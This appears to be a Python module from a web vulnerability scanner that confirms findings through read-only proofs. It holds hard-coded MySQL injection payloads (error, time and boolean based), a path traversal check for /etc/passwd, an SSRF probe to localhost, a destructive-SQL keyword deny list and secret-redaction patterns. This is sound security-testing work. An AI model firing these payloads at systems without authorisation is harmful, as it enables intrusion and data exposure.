"""Read-only proof extraction for confirmed vulnerabilities.

Strict rules — these are enforced at module-import time and by pytest:
  * Every SQL payload string is a module-level constant. We never build SQL
    by concatenating attacker-supplied input.
  * `_assert_select_only(sql)` rejects anything that isn't a single SELECT-shaped
    statement. Every SQL constant is validated against it at import.
  * No filesystem writes, no HTTP method that modifies state. HEAD/GET/POST
    are used only with read-only intent — POST is allowed because some SSRF
    endpoints require it, but the body is constant and references nothing
    user-controlled.
  * Output is run through `_redact` before being placed into the report so
    DB passwords / API keys never leak into shared HTML / JSON.

The proof helpers are intentionally minimal — just enough to convert
"the scanner thinks this is vulnerable" into "the scanner extracted N bytes
of evidence proving it". Anything more (table dumps, password hash
extraction, file writes, RCE) is out of scope; use sqlmap / Metasploit.
"""
from __future__ import annotations

import re
import time
from typing import Any

from .http import Client

# ============================== Safety guard ==============================

_DESTRUCTIVE_KEYWORDS = (
    "INSERT", "UPDATE", "DELETE", "DROP", "CREATE", "ALTER", "TRUNCATE",
    "REPLACE", "MERGE", "EXEC", "EXECUTE", "CALL", "GRANT", "REVOKE",
    "RENAME", "LOCK", "UNLOCK", "ANALYZE", "OPTIMIZE", "REPAIR",
    "HANDLER", "START", "COMMIT", "ROLLBACK", "SAVEPOINT", "RELEASE",
    "OUTFILE", "DUMPFILE", "LOAD_FILE", "LOAD DATA", "INTO OUTFILE",
    "INTO DUMPFILE",
)

# Tokenization: split on non-word characters so multi-word keywords still match.
_TOKEN_RE = re.compile(r"\w+")


def _assert_select_only(sql: str, fragment: bool = False) -> bool:
    """Return True if `sql` is SELECT-shaped and contains no destructive ops; else raise.

    `fragment=True` allows payloads like `' AND (SELECT ...)-- -` that are
    meant to be appended to an injectable parameter. They still must not
    contain any destructive keyword token.

    Defensive parsing — not a complete SQL parser. The real safety property
    is "no destructive keywords"; the SELECT/UNION/WITH start-check is a
    belt-and-suspenders gate for complete statements only.
    """
    if not isinstance(sql, str):
        raise ValueError("SQL must be a string")
    if len(sql) > 600:
        raise ValueError("SQL payload exceeds 600-byte cap")
    if ";" in sql:
        raise ValueError("Multi-statement SQL is not permitted")
    if not fragment:
        head = sql.lstrip().lstrip("(").lstrip().upper()
        if not (head.startswith("SELECT") or head.startswith("UNION") or head.startswith("WITH ")):
            raise ValueError(f"SQL does not start SELECT/UNION/WITH: {sql[:50]!r}")
    tokens = {t.upper() for t in _TOKEN_RE.findall(sql)}
    for kw in _DESTRUCTIVE_KEYWORDS:
        # Multi-word keywords like "INTO OUTFILE" need substring check
        if " " in kw:
            if kw in sql.upper():
                raise ValueError(f"Destructive token found in SQL: {kw}")
            continue
        if kw in tokens:
            raise ValueError(f"Destructive token found in SQL: {kw}")
    return True


# ============================== SQL constants ==============================
# All SQL is hard-coded here. Anything fed to a SQLi probe must be one of these.

SQL_ERROR_EXTRACT_VERSION = "' AND extractvalue(1, concat(0x7e, version()))-- -"
SQL_TIME_PROBE_VERSION_8  = "' AND IF(version() LIKE '8.%', SLEEP(2), 0)-- -"
SQL_TIME_PROBE_VERSION_5  = "' AND IF(version() LIKE '5.%', SLEEP(2), 0)-- -"
SQL_BOOL_PROBE_VERSION_8  = "' AND (SELECT 1 FROM dual WHERE version() LIKE '8.%')-- -"
SQL_BOOL_PROBE_VERSION_5  = "' AND (SELECT 1 FROM dual WHERE version() LIKE '5.%')-- -"

# Validate at import so a typo trips the test suite, not a user. All proof
# payloads here are fragments (suffixed onto an injectable parameter, not
# standalone statements), so we pass fragment=True. The destructive-keyword
# check still runs.
for _q in (
    SQL_ERROR_EXTRACT_VERSION,
    SQL_TIME_PROBE_VERSION_8,
    SQL_TIME_PROBE_VERSION_5,
    SQL_BOOL_PROBE_VERSION_8,
    SQL_BOOL_PROBE_VERSION_5,
):
    _assert_select_only(_q, fragment=True)


# ============================== Redaction ==============================

_REDACT_PATTERNS = (
    # WP wp-config secrets
    re.compile(r"(define\s*\(\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"])([^'\"]*)(['\"])", re.IGNORECASE),
    re.compile(r"(define\s*\(\s*['\"]AUTH_KEY['\"]\s*,\s*['\"])([^'\"]*)(['\"])", re.IGNORECASE),
    re.compile(r"(define\s*\(\s*['\"]SECURE_AUTH_KEY['\"]\s*,\s*['\"])([^'\"]*)(['\"])", re.IGNORECASE),
    re.compile(r"(define\s*\(\s*['\"]LOGGED_IN_KEY['\"]\s*,\s*['\"])([^'\"]*)(['\"])", re.IGNORECASE),
    re.compile(r"(define\s*\(\s*['\"]NONCE_KEY['\"]\s*,\s*['\"])([^'\"]*)(['\"])", re.IGNORECASE),
    re.compile(r"(define\s*\(\s*['\"][A-Z_]*SALT[A-Z_]*['\"]\s*,\s*['\"])([^'\"]*)(['\"])", re.IGNORECASE),
    # Generic api-key shaped tokens (32+ hex/base64-ish)
    re.compile(r"\b([A-Fa-f0-9]{32,})\b"),
    re.compile(r"\bsk-[A-Za-z0-9]{20,}\b"),  # OpenAI-style
)


def _redact(text: str) -> str:
    out = text
    for pat in _REDACT_PATTERNS[:6]:
        out = pat.sub(lambda m: m.group(1) + "[REDACTED]" + m.group(3), out)
    for pat in _REDACT_PATTERNS[6:]:
        out = pat.sub("[REDACTED]", out)
    return out


# ============================== Replay command builder ==============================

def build_replay_curl(method: str, url: str, params: dict | None = None,
                      headers: dict | None = None, body: str | None = None) -> str:
    """Build a copy-pasteable curl command that reproduces a request."""
    parts = ["curl"]
    if method != "GET":
        parts.append(f"-X {method}")
    full_url = url
    if params:
        # Build a query-string suffix the same way httpx would
        from urllib.parse import urlencode, urlparse, urlunparse
        u = urlparse(url)
        existing = u.query
        new_q = urlencode(params, doseq=True)
        combined = (existing + "&" + new_q).lstrip("&") if existing else new_q
        full_url = urlunparse(u._replace(query=combined))
    parts.append(f"'{full_url}'")
    for k, v in (headers or {}).items():
        parts.append(f"-H '{k}: {v}'")
    if body is not None:
        # Single-quote escape: replace ' with '\''
        b = body.replace("'", "'\\''")
        parts.append(f"--data-binary '{b}'")
    parts.append("-i")  # include response headers
    return " ".join(parts)


# ============================== Proof helpers ==============================

async def prove_sqli(client: Client, finding_extra: dict) -> dict[str, Any]:
    """Confirm SQLi by extracting `version()` via the same vector that worked.

    Reads ONE non-PII fact (database version). No table enumeration, no auth
    data, no schema introspection.
    """
    param = finding_extra.get("param")
    vector = finding_extra.get("vector")  # "error" | "boolean" | "time"
    baseline_path = finding_extra.get("baseline_path") or "/"
    baseline_value = finding_extra.get("baseline_value", "1")
    if not param or not vector:
        return {"skipped": "missing param/vector hints"}

    queries_run: list[str] = []
    extracted: dict[str, Any] = {}

    if vector == "error":
        sql = SQL_ERROR_EXTRACT_VERSION
        _assert_select_only(sql, fragment=True)
        queries_run.append(sql)
        r = await client.get(baseline_path, params={param: baseline_value + sql})
        if r is None:
            return {"queries_run": queries_run, "extracted": {}, "safe_audit": "select-only", "result": "no response"}
        # extractvalue() throws an error containing the data we asked for, prefixed by ~
        m = re.search(r"~([\w\.\-]+)", r.text or "")
        if m:
            extracted["mysql_version"] = m.group(1)

    elif vector == "time":
        # Two timed probes — does version() start with "8." or "5."?
        async def _timed(sql: str) -> float:
            t0 = time.perf_counter()
            await client.get(baseline_path, params={param: baseline_value + sql})
            return time.perf_counter() - t0

        for sql in (SQL_TIME_PROBE_VERSION_8, SQL_TIME_PROBE_VERSION_5):
            _assert_select_only(sql, fragment=True)
            queries_run.append(sql)
            delta = await _timed(sql)
            if delta >= 1.8:
                if "8" in sql:
                    extracted["mysql_version_family"] = "8.x"
                else:
                    extracted["mysql_version_family"] = "5.x"
                break

    elif vector == "boolean":
        async def _len(sql: str) -> int:
            r = await client.get(baseline_path, params={param: baseline_value + sql})
            return len(r.content or b"") if r else 0

        baseline_len = await _len("")
        for sql in (SQL_BOOL_PROBE_VERSION_8, SQL_BOOL_PROBE_VERSION_5):
            _assert_select_only(sql, fragment=True)
            queries_run.append(sql)
            probe_len = await _len(sql)
            # If response shape matches baseline closely, the predicate was truthy
            if baseline_len and abs(probe_len - baseline_len) / max(baseline_len, 1) < 0.05:
                extracted["mysql_version_family"] = "8.x" if "8" in sql else "5.x"
                break

    return {
        "queries_run": queries_run,
        "extracted": extracted,
        "safe_audit": "select-only",
        "method": vector,
        "summary": ("Extracted: " + ", ".join(f"{k}={v}" for k, v in extracted.items())) if extracted else "No data extracted (vector confirmed but proof inconclusive)",
    }


async def prove_path_traversal(client: Client, finding_extra: dict) -> dict[str, Any]:
    """Re-fetch the same traversal that triggered the finding and confirm
    the read is deterministic. We deliberately do NOT pivot to wp-config.php
    or attempt to read other files — that's a job for sqlmap/manual review."""
    param = finding_extra.get("param")
    payload_template = finding_extra.get("payload_template")
    path = finding_extra.get("baseline_path", "/")
    if not param or not payload_template:
        return {"skipped": "missing param/payload hints"}

    r = await client.get(path, params={param: payload_template})
    if r is None:
        return {"safe_audit": "single-read", "extracted": {}, "summary": "no response"}

    snippet_raw = (r.text or "")[:200]
    snippet = _redact(snippet_raw)
    looks_like_passwd = "root:x:0:0" in snippet_raw

    extracted: dict[str, Any] = {
        "bytes_read": len(snippet_raw),
        "confirmed_deterministic": looks_like_passwd,
        "preview_redacted": snippet,
    }
    return {
        "safe_audit": "single-read, 200-byte cap, redacted, same payload as detection",
        "extracted": extracted,
        "summary": (
            "Path traversal confirmed deterministic — same payload reads /etc/passwd twice"
            if looks_like_passwd
            else "Read succeeded but content didn't match expected signature"
        ),
    }


async def prove_ssrf(client: Client, finding_extra: dict) -> dict[str, Any]:
    """Confirm SSRF by pointing the vulnerable endpoint at 127.0.0.1:80."""
    endpoint = finding_extra.get("endpoint")
    param = finding_extra.get("param")
    if not endpoint or not param:
        return {"skipped": "missing endpoint/param hints"}

    # Localhost ONLY. Not cloud metadata. Not any RFC1918 address.
    target = "http://127.0.0.1:80/"
    r = await client.get(endpoint, params={param: target})
    if r is None:
        return {"safe_audit": "localhost-only", "extracted": {}, "summary": "no response"}

    body = (r.text or "")[:100]
    extracted: dict[str, Any] = {
        "probe_target": target,
        "upstream_status": r.status_code,
        "upstream_body_preview": body,
        "indicates_localhost_reached": any(
            s in body.lower() for s in ("apache", "nginx", "litespeed", "<html", "<!doctype")
        ),
    }
    return {
        "safe_audit": "localhost-only, single GET",
        "extracted": extracted,
        "summary": (
            "Internal localhost reachable through SSRF endpoint"
            if extracted["indicates_localhost_reached"]
            else f"Endpoint accepted target=127.0.0.1 but upstream response inconclusive (HTTP {r.status_code})"
        ),
    }


async def prove_xss_reflection_persistence(client: Client, finding_extra: dict) -> dict[str, Any]:
    """Re-fetch the same URL+payload and confirm the reflection is consistent."""
    param = finding_extra.get("param")
    payload = finding_extra.get("payload")
    path = finding_extra.get("baseline_path", "/")
    marker = finding_extra.get("marker")
    if not param or not payload or not marker:
        return {"skipped": "missing param/payload/marker hints"}

    r = await client.get(path, params={param: payload})
    if r is None:
        return {"safe_audit": "single-read", "extracted": {}, "summary": "no response"}

    reflected = marker in (r.text or "")
    return {
        "safe_audit": "single-read, no submission",
        "extracted": {
            "reflection_repeatable": reflected,
            "marker": marker,
        },
        "summary": "Reflection is deterministic (repeats across requests)" if reflected else "Reflection was transient (did not repeat)",
    }


async def prove_open_redirect(client: Client, finding_extra: dict) -> dict[str, Any]:
    """No-op: open redirect is fully proven by the detection logic itself."""
    return {
        "safe_audit": "no-op",
        "extracted": {},
        "summary": "Detection already includes the Location-header evidence; no further proof step needed.",
    }


# ============================== Dispatch ==============================

PROVERS = {
    "sqli":              prove_sqli,
    "path_traversal":    prove_path_traversal,
    "ssrf":              prove_ssrf,
    "xss_reflected":     prove_xss_reflection_persistence,
    "open_redirect":     prove_open_redirect,
}
